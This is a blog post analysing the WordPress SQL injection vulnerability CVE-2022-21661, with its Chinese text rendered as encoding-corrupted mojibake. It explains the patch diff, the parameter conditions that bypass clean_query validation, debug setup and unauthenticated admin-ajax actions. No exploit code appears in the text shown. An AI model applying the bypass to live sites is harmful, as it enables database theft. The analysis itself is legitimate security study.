<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.2.0">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/Blinky.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/Blinky.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" integrity="sha256-DfWjNxDkM94fVBWx1H5BMMp0Zq7luBlV8QRcSES7s+0=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"www.guestblog.xyz","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.12.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>

    <meta name="description" content="äº§å“ä»‹ç»WordPressæ˜¯ä¸€ä¸ªä»¥PHPå’ŒMySQLä¸ºå¹³å°çš„è‡ªç”±å¼€æºçš„åšå®¢è½¯ä»¶å’Œå†…å®¹ç®¡ç†ç³»ç»Ÿã€‚WordPresså…·æœ‰æ’ä»¶æ¶æ„å’Œæ¨¡æ¿ç³»ç»Ÿã€‚æˆªè‡³2018å¹´4æœˆï¼Œæ’åå‰1000ä¸‡çš„ç½‘ç«™ä¸­è¶…è¿‡30.6%ä½¿ç”¨WordPressã€‚WordPressæ˜¯æœ€å—æ¬¢è¿çš„ç½‘ç«™å†…å®¹ç®¡ç†ç³»ç»Ÿã€‚å…¨çƒæœ‰å¤§çº¦40%çš„ç½‘ç«™(7äº¿5000ä¸ª)éƒ½æ˜¯ä½¿ç”¨WordPressæ¶è®¾ç½‘ç«™çš„ã€‚WordPressæ˜¯ç›®å‰å› ç‰¹ç½‘ä¸Šæœ€æµè¡Œçš„åšå®¢ç³»ç»Ÿã€‚Wor">
<meta property="og:type" content="article">
<meta property="og:title" content="Wordpress SQLæ³¨å…¥æ¼æ´(CVE-2022-21661)åˆ†æ">
<meta property="og:url" content="https://www.guestblog.xyz/2022/02/23/CVE-2022-21661/index.html">
<meta property="og:site_name" content="Guest&#39;s Blog">
<meta property="og:description" content="äº§å“ä»‹ç»WordPressæ˜¯ä¸€ä¸ªä»¥PHPå’ŒMySQLä¸ºå¹³å°çš„è‡ªç”±å¼€æºçš„åšå®¢è½¯ä»¶å’Œå†…å®¹ç®¡ç†ç³»ç»Ÿã€‚WordPresså…·æœ‰æ’ä»¶æ¶æ„å’Œæ¨¡æ¿ç³»ç»Ÿã€‚æˆªè‡³2018å¹´4æœˆï¼Œæ’åå‰1000ä¸‡çš„ç½‘ç«™ä¸­è¶…è¿‡30.6%ä½¿ç”¨WordPressã€‚WordPressæ˜¯æœ€å—æ¬¢è¿çš„ç½‘ç«™å†…å®¹ç®¡ç†ç³»ç»Ÿã€‚å…¨çƒæœ‰å¤§çº¦40%çš„ç½‘ç«™(7äº¿5000ä¸ª)éƒ½æ˜¯ä½¿ç”¨WordPressæ¶è®¾ç½‘ç«™çš„ã€‚WordPressæ˜¯ç›®å‰å› ç‰¹ç½‘ä¸Šæœ€æµè¡Œçš„åšå®¢ç³»ç»Ÿã€‚Wor">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://www.guestblog.xyz/2022/02/23/CVE-2022-21661/1.png">
<meta property="og:image" content="https://www.guestblog.xyz/2022/02/23/CVE-2022-21661/2.png">
<meta property="og:image" content="https://www.guestblog.xyz/2022/02/23/CVE-2022-21661/3.png">
<meta property="og:image" content="https://www.guestblog.xyz/2022/02/23/CVE-2022-21661/4.png">
<meta property="og:image" content="https://www.guestblog.xyz/2022/02/23/CVE-2022-21661/image-20220310104205786.png">
<meta property="og:image" content="https://www.guestblog.xyz/2022/02/23/CVE-2022-21661/image-20220310134829926.png">
<meta property="og:image" content="https://www.guestblog.xyz/2022/02/23/CVE-2022-21661/image-20220310124411147.png">
<meta property="og:image" content="https://www.guestblog.xyz/2022/02/23/CVE-2022-21661/image-20220310133738089.png">
<meta property="og:image" content="https://www.guestblog.xyz/2022/02/23/CVE-2022-21661/image-20220310135036639-9251439.png">
<meta property="og:image" content="https://www.guestblog.xyz/2022/02/23/CVE-2022-21661/image-20220310140219282-9251467.png">
<meta property="og:image" content="https://www.guestblog.xyz/2022/02/23/CVE-2022-21661/image-20220310135520704.png">
<meta property="og:image" content="https://www.guestblog.xyz/2022/02/23/CVE-2022-21661/image-20220310141910867.png">
<meta property="og:image" content="https://www.guestblog.xyz/2022/02/23/CVE-2022-21661/image-20220310141601482.png">
<meta property="og:image" content="https://www.guestblog.xyz/2022/02/23/CVE-2022-21661/image-20220310141632481.png">
<meta property="og:image" content="https://www.guestblog.xyz/2022/02/23/CVE-2022-21661/image-20220310142141577.png">
<meta property="og:image" content="https://www.guestblog.xyz/2022/02/23/CVE-2022-21661/image-20220310142226689.png">
<meta property="og:image" content="https://www.guestblog.xyz/2022/02/23/CVE-2022-21661/image-20220310142316362.png">
<meta property="og:image" content="https://www.guestblog.xyz/2022/02/23/CVE-2022-21661/image-20220310142425409.png">
<meta property="og:image" content="https://www.guestblog.xyz/2022/02/23/CVE-2022-21661/image-20220310142505819.png">
<meta property="og:image" content="https://www.guestblog.xyz/2022/02/23/CVE-2022-21661/image-20220411144538139-9267068.png">
<meta property="article:published_time" content="2022-02-23T10:20:23.000Z">
<meta property="article:modified_time" content="2022-07-31T11:31:44.611Z">
<meta property="article:author" content="Guest">
<meta property="article:tag" content="wordpress">
<meta property="article:tag" content="php">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://www.guestblog.xyz/2022/02/23/CVE-2022-21661/1.png">


<link rel="canonical" href="https://www.guestblog.xyz/2022/02/23/CVE-2022-21661/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://www.guestblog.xyz/2022/02/23/CVE-2022-21661/","path":"2022/02/23/CVE-2022-21661/","title":"Wordpress SQLæ³¨å…¥æ¼æ´(CVE-2022-21661)åˆ†æ"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>Wordpress SQLæ³¨å…¥æ¼æ´(CVE-2022-21661)åˆ†æ | Guest's Blog</title>
  





  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">Guest's Blog</p>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">11</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">7</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">11</span></a></li>
  </ul>
</nav>




</div>
        
  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BA%A7%E5%93%81%E4%BB%8B%E7%BB%8D"><span class="nav-number">1.</span> <span class="nav-text">äº§å“ä»‹ç»</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#wordpress%E7%9A%84%E7%BB%93%E6%9E%84"><span class="nav-number">1.1.</span> <span class="nav-text">wordpressçš„ç»“æ„</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B"><span class="nav-number">2.</span> <span class="nav-text">æ¼æ´ç®€ä»‹</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%A1%A5%E4%B8%81%E5%88%86%E6%9E%90"><span class="nav-number">3.</span> <span class="nav-text">è¡¥ä¸åˆ†æ</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">4.</span> <span class="nav-text">æ¼æ´è°ƒè¯•ç¯å¢ƒæ­å»º</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="nav-number">5.</span> <span class="nav-text">æ¼æ´ä»£ç åˆ†æ</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#admin-ajax-php"><span class="nav-number">5.1.</span> <span class="nav-text">admin-ajax.php</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%AD%A6%E5%99%A8%E5%8C%96%E5%88%A9%E7%94%A8"><span class="nav-number">6.</span> <span class="nav-text">æ­¦å™¨åŒ–åˆ©ç”¨</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8F%92%E4%BB%B6%E5%AE%89%E8%A3%85"><span class="nav-number">6.1.</span> <span class="nav-text">æ’ä»¶å®‰è£…</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B0%9D%E8%AF%95%E6%89%93%E9%80%9A"><span class="nav-number">6.2.</span> <span class="nav-text">å°è¯•æ‰“é€š</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AD%A6%E5%99%A8%E5%8C%96%E8%84%9A%E6%9C%AC"><span class="nav-number">6.2.1.</span> <span class="nav-text">æ­¦å™¨åŒ–è„šæœ¬</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF"><span class="nav-number">6.3.</span> <span class="nav-text">æ€è·¯</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="nav-number">7.</span> <span class="nav-text">å‚è€ƒèµ„æ–™</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Guest"
      src="/images/duck2.jpg">
  <p class="site-author-name" itemprop="name">Guest</p>
  <div class="site-description" itemprop="description">webğŸ¶</div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">11</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">7</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">11</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author site-overview-item animated">
      <span class="links-of-author-item">
        <a href="https://github.com/QWERTYisme" title="GitHub â†’ https:&#x2F;&#x2F;github.com&#x2F;QWERTYisme" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:Roywangjiahe@outlook.com" title="E-Mail â†’ mailto:Roywangjiahe@outlook.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>



        </div>
      </div>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="back-to-top" role="button" aria-label="Back to top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>

  <a href="https://github.com/QWERTYisme" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
    <link itemprop="mainEntityOfPage" href="https://www.guestblog.xyz/2022/02/23/CVE-2022-21661/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/duck2.jpg">
      <meta itemprop="name" content="Guest">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Guest's Blog">
      <meta itemprop="description" content="webğŸ¶">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="Wordpress SQLæ³¨å…¥æ¼æ´(CVE-2022-21661)åˆ†æ | Guest's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          Wordpress SQLæ³¨å…¥æ¼æ´(CVE-2022-21661)åˆ†æ
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-02-23 18:20:23" itemprop="dateCreated datePublished" datetime="2022-02-23T18:20:23+08:00">2022-02-23</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2022-07-31 19:31:44" itemprop="dateModified" datetime="2022-07-31T19:31:44+08:00">2022-07-31</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/CVE/" itemprop="url" rel="index"><span itemprop="name">CVE</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <h1 id="äº§å“ä»‹ç»"><a href="#äº§å“ä»‹ç»" class="headerlink" title="äº§å“ä»‹ç»"></a><strong>äº§å“ä»‹ç»</strong></h1><p><strong>WordPress</strong>æ˜¯ä¸€ä¸ªä»¥PHPå’ŒMySQLä¸ºå¹³å°çš„è‡ªç”±å¼€æºçš„åšå®¢è½¯ä»¶å’Œå†…å®¹ç®¡ç†ç³»ç»Ÿã€‚WordPresså…·æœ‰æ’ä»¶æ¶æ„å’Œæ¨¡æ¿ç³»ç»Ÿã€‚æˆªè‡³2018å¹´4æœˆï¼Œæ’åå‰1000ä¸‡çš„ç½‘ç«™ä¸­è¶…è¿‡30.6%ä½¿ç”¨WordPressã€‚WordPressæ˜¯æœ€å—æ¬¢è¿çš„ç½‘ç«™å†…å®¹ç®¡ç†ç³»ç»Ÿã€‚å…¨çƒæœ‰å¤§çº¦40%çš„ç½‘ç«™(7äº¿5000ä¸ª)éƒ½æ˜¯ä½¿ç”¨WordPressæ¶è®¾ç½‘ç«™çš„ã€‚WordPressæ˜¯ç›®å‰å› ç‰¹ç½‘ä¸Šæœ€æµè¡Œçš„åšå®¢ç³»ç»Ÿã€‚WordPressåœ¨æœ€è‘—åçš„ç½‘ç»œå‘å¸ƒé˜¶æ®µä¸­è„±é¢–è€Œå‡ºã€‚å¦‚ä»Šï¼Œå®ƒè¢«ä½¿ç”¨åœ¨è¶…è¿‡7000ä¸‡ä¸ªç«™ç‚¹ä¸Šã€‚</p>
<h2 id="wordpressçš„ç»“æ„"><a href="#wordpressçš„ç»“æ„" class="headerlink" title="wordpressçš„ç»“æ„"></a>wordpressçš„ç»“æ„</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">â”œâ”€wp-admin</span><br><span class="line">â”œâ”€wp-content</span><br><span class="line">â”‚  â”œâ”€languages</span><br><span class="line">â”‚  â”œâ”€plugins</span><br><span class="line">â”‚  â”œâ”€themes</span><br><span class="line">â”œâ”€wp-includes</span><br><span class="line">â”œâ”€index.php</span><br><span class="line">â”œâ”€wp-login.php</span><br><span class="line">â”œâ”€wp-config.php</span><br><span class="line">â”œâ”€...</span><br></pre></td></tr></table></figure>

<ul>
<li>wp-admin ä¸ºåå°ç®¡ç†æ–‡ä»¶å¤¹</li>
<li>wp-content ä¸­åŒ…å«ä¸»é¢˜é…ç½®æ–‡ä»¶ã€æ’ä»¶ã€ä¸Šä¼ çš„æ–‡ä»¶ã€å‡çº§ä¸´æ—¶æ–‡ä»¶ï¼Œè¯¥ç›®å½•ä¸ºæ˜“å—æ”»å‡»çš„åœ°æ–¹</li>
<li>wp-includes åˆ™æ˜¯ä¸€äº›æ ¸å¿ƒä»£ç ï¼ŒåŒ…æ‹¬å‰å°ä»£ç ä¹Ÿåœ¨è¿™é‡Œ</li>
<li>wp-config.php è¿™ä¸ªæ–‡ä»¶å‘Šè¯‰WordPresså¦‚ä½•å»è¿æ¥æ•°æ®åº“</li>
<li>wp-login.php ç™»é™†æ–‡ä»¶</li>
</ul>
<h1 id="æ¼æ´ç®€ä»‹"><a href="#æ¼æ´ç®€ä»‹" class="headerlink" title="æ¼æ´ç®€ä»‹"></a>æ¼æ´ç®€ä»‹</h1><p>é€šè¿‡è¯¥æ–‡ç« <a target="_blank" rel="noopener" href="https://www.zerodayinitiative.com/blog/2022/1/18/cve-2021-21661-exposing-database-info-via-wordpress-sql-injection">https://www.zerodayinitiative.com/blog/2022/1/18/cve-2021-21661-exposing-database-info-via-wordpress-sql-injection</a> ï¼Œæˆ‘å¤§æ¦‚å¯¹è¯¥æ¼æ´æƒ…å†µè¿›è¡Œäº†ä¸€äº›äº†è§£ã€‚</p>
<p>é€šå¸¸æ¥è¯´ï¼ŒWordpressä¼šåœ¨ä½ æ‰€æœ‰å±•ç°çš„ç½‘é¡µä¸Šè¿è¡Œqueryï¼ˆæŸ¥è¯¢ï¼‰åŠŸèƒ½ï¼ŒæŸ¥è¯¢ä¸åŒçš„å±æ€§å†³å®šäº†ä½ æ‰€çœ‹åˆ°é¡µé¢ã€‚å› æ­¤ï¼Œå¦‚æœä½ æ­£åœ¨æŸ¥çœ‹ä¸€ä¸ªé™æ€é¡µé¢ï¼ŒWordPressçš„è¿è¡ŒæŸ¥è¯¢ç›¸å…³IDæ¥æ˜¾ç¤ºé¡µé¢ï¼Œè€Œå¦‚æœå½’æ¡£é¡µé¢è¢«æµè§ˆï¼ŒæŸ¥è¯¢å°†æ£€ç´¢è¯¥å½’æ¡£çš„æ‰€æœ‰æ–‡ç« ã€‚</p>
<p>è¯¥ç‰ˆæœ¬çš„wordpressäºWP_Queryå¤„å­˜åœ¨SQLæ³¨å…¥æ¼æ´ã€‚WP_Queryæ˜¯wordpresså®šä¹‰çš„ä¸€ä¸ªç±»ï¼Œå…è®¸å¼€å‘è€…ç¼–å†™è‡ªå®šä¹‰æŸ¥è¯¢å’Œä½¿ç”¨ä¸åŒçš„å‚æ•°å±•ç¤ºæ–‡ç« ï¼Œå¹¶å¯ä»¥ç›´æ¥æŸ¥è¯¢wordpressæ•°æ®åº“ï¼Œåœ¨æ ¸å¿ƒæ¡†æ¶å’Œæ’ä»¶ä»¥åŠä¸»é¢˜ä¸­å¹¿æ³›ä½¿ç”¨ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä¸€èˆ¬æƒ…å†µä¸‹æ™®é€šçš„ç”¨æˆ·è¾“å…¥æ— æ³•è§¦å‘è¯¥æ¼æ´ï¼Œè¯¥æ¼æ´å­˜åœ¨äºéƒ¨åˆ†è°ƒç”¨äº†è¯¥WP_Queryç±»çš„wordpressæ’ä»¶ä¸­ã€‚é€šè¿‡æ§åˆ¶è¯¥ç±»çš„è¾“å…¥å‚æ•°ï¼Œå¯ä»¥è¾¾åˆ°SQLæ³¨å…¥çš„ç›®çš„ã€‚</p>
<span id="more"></span>

<h1 id="è¡¥ä¸åˆ†æ"><a href="#è¡¥ä¸åˆ†æ" class="headerlink" title="è¡¥ä¸åˆ†æ"></a>è¡¥ä¸åˆ†æ</h1><p>æˆ‘ä»¬åœ¨githubæœç´¢å†å²å‘è¡Œç‰ˆæœ¬ï¼Œåœ¨tagä¸­æ‰¾åˆ°5.8.2å’Œ5.8.3ç‰ˆæœ¬è¿›è¡Œcommitçš„æ¯”å¯¹ã€‚</p>
<img src="/2022/02/23/CVE-2022-21661/1.png" class="" width="1">

<p>æˆ‘ä»¬å¯ä»¥å‘ç°ï¼ŒåŸæ¥å¯¹äºtermsæ•°ç»„çš„å¤„ç†ä»…ä»…æ˜¯å°†å…¶å»é‡ï¼Œå°”åè¿™äº›æ•°æ®ä¼šè¢«æ‹¼æ¥è‡³SQLæŸ¥è¯¢è¯­å¥ä¸­ã€‚è¯¥clean_queryæ–¹æ³•çš„å®é™…ä½œç”¨æ˜¯åœ¨è¿›è¡ŒSQLæŸ¥è¯¢ä¹‹å‰å¯¹è¾“å…¥æ•°æ®è¿›è¡Œä¸€ä¸ªåˆæ³•æ€§æ ¡éªŒã€‚ä½†åœ¨&lt;5.8.3çš„ç‰ˆæœ¬æ—¶è¿™ä¸ªå‡½æ•°å¹¶ä¸èƒ½å¾ˆå¥½çš„åšåˆ°åˆæ³•æ€§æ ¡éªŒã€‚å¦‚æœå°†taxonomyå‚æ•°ç½®ç©ºã€åŒæ—¶fieldå‚æ•°å€¼ç­‰äºå­—ç¬¦ä¸²â€™term_taxonomy_idâ€™ï¼Œåˆ™ä½¿å¾—è¯¥clean_queryæ–¹æ³•æ— æ³•å¯¹termsçš„åˆæ³•æ€§è¿›è¡Œæ ¡éªŒã€‚</p>
<p>é€šè¿‡è§‚å¯Ÿè¡¥ä¸ï¼Œæˆ‘ä»¬å‘ç°ï¼Œå·²ç»æ— æ³•é€šè¿‡è®¾ç½®fieldå‚æ•°å€¼ç»•è¿‡å¯¹termsåˆæ³•æ€§çš„æ ¡éªŒï¼Œå› ä¸ºåœ¨æ­¤å¤„ä¼šæ£€æŸ¥fieldçš„å€¼æ˜¯å¦æ»¡è¶³ç­‰äºâ€™nameâ€™æˆ–è€…â€™slugâ€™ï¼Œå¦‚æœæ•…æ„è®¾ç½®æˆè¿™æ ·åˆ™æ— æ³•ç»•è¿‡clean_queryæ–¹æ³•å‰é¢å¯¹fieldçš„æ£€æŸ¥ã€‚å¦åˆ™ï¼Œå°†ä¼šå¯¹termsç”¨wp_parse_id_listæ–¹æ³•è¿›è¡Œè¿‡æ»¤ã€‚è¿™ä¸ªåé¢åˆ†æ</p>
<h1 id="æ¼æ´è°ƒè¯•ç¯å¢ƒæ­å»º"><a href="#æ¼æ´è°ƒè¯•ç¯å¢ƒæ­å»º" class="headerlink" title="æ¼æ´è°ƒè¯•ç¯å¢ƒæ­å»º"></a>æ¼æ´è°ƒè¯•ç¯å¢ƒæ­å»º</h1><p>åœ¨wordpresså®˜ç½‘ä¸‹è½½5.8.2çš„wordpressç¯å¢ƒã€‚</p>
<p>ç”µè„‘å·²ç»æœ‰ç°æˆçš„wampserver+vscodeçš„è°ƒè¯•ç¯å¢ƒï¼Œé¦–å…ˆåœ¨MYSQLæ–°å»ºwordpressæ•°æ®åº“ï¼Œå°†wordpressåˆå§‹åŒ–å¥½ï¼Œé“¾æ¥å¥½æ•°æ®åº“ã€‚æ‰“å¼€wp-config.phpï¼Œå°†debugå­—æ®µè®¾ç½®ä¸ºtrueï¼Œå³å¯å¼€å§‹å•æ­¥è°ƒè¯•wordpressã€‚</p>
<img src="/2022/02/23/CVE-2022-21661/2.png" class="" width="2">

<img src="/2022/02/23/CVE-2022-21661/3.png" class="" width="3">

<h1 id="æ¼æ´ä»£ç åˆ†æ"><a href="#æ¼æ´ä»£ç åˆ†æ" class="headerlink" title="æ¼æ´ä»£ç åˆ†æ"></a>æ¼æ´ä»£ç åˆ†æ</h1><p>æ­å»ºå¥½ç¯å¢ƒåï¼Œé¦–å…ˆæ˜¯å°è¯•åˆ©ç”¨expè¿›è¡Œè°ƒè¯•ï¼ŒæŸ¥çœ‹è¯¥clean_queryæ–¹æ³•çš„åˆ©ç”¨é“¾ã€‚æˆ‘é¦–å…ˆæ˜¯ä¿®æ”¹admin-ajax.phpçš„å†…å®¹æ‰‹åŠ¨åŠ å…¥å¯¹äºWP_Queryç±»çš„å®ä¾‹åŒ–å¹¶æ§åˆ¶ä¼ å…¥çš„å‚æ•°è¿›è¡Œè°ƒè¯•ã€‚</p>
<img src="/2022/02/23/CVE-2022-21661/4.png" class="">

<h2 id="admin-ajax-php"><a href="#admin-ajax-php" class="headerlink" title="admin-ajax.php"></a>admin-ajax.php</h2><p>åœ¨wordpresså½“ä¸­ï¼Œå½“ç”¨æˆ·çš„é¡µé¢ã€æ’ä»¶æˆ–è€…ä¸»é¢˜å‘å‡ºajaxè¯·æ±‚çš„æ—¶å€™ï¼Œè¿™ä¸ªè¯·æ±‚å°†è¢«è·¯ç”±åˆ°admin-ajax.phpé¡µé¢ï¼Œè¯¥é¡µé¢è°ƒç”¨php handleç„¶åå†è¿”å›ä¸€ä¸ªç»“æœã€‚æˆ‘ä»¬å¯ä»¥æ˜¾å¼åœ°è®¿é—®è¿™ä¸ªé¡µé¢ï¼ˆå³ä¾¿æ˜¯åœ¨æœªæˆæƒçš„æƒ…å†µä¸‹ï¼‰ï¼Œé€šè¿‡æŒ‡å®šactionå‚æ•°ï¼Œå°è¯•å»è°ƒç”¨wordpressä¸­å­˜åœ¨çš„actionæ‰€å¯¹åº”ç»‘å®šçš„å‡½æ•°ã€‚</p>
<p>æˆ‘ä»¬å¯ä»¥çœ‹ä¸€ä¸‹ajaxå¯¹äºç”¨æˆ·æ“ä½œçš„ä¸åŒå¤„ç†æ–¹å¼ã€‚</p>
<img src="/2022/02/23/CVE-2022-21661/image-20220310104205786.png" class="" title="image-20220310104205786">

<p>å¯ä»¥çœ‹åˆ°wordpresså°†actionåˆ†ç±»æˆä¸ºä¸¤ç§ï¼š</p>
<ul>
<li>éœ€è¦adminæƒé™çš„æ“ä½œ</li>
<li>ä¸éœ€è¦adminæƒé™çš„æ“ä½œï¼ˆè®¿å®¢actionï¼‰</li>
</ul>
<p>ä»–ä»¬çš„æ ¼å¼åˆ†åˆ«æ˜¯ï¼š</p>
<ul>
<li>wp_ajax_{$action}</li>
<li>wp_ajax_nopriv_{$action}</li>
</ul>
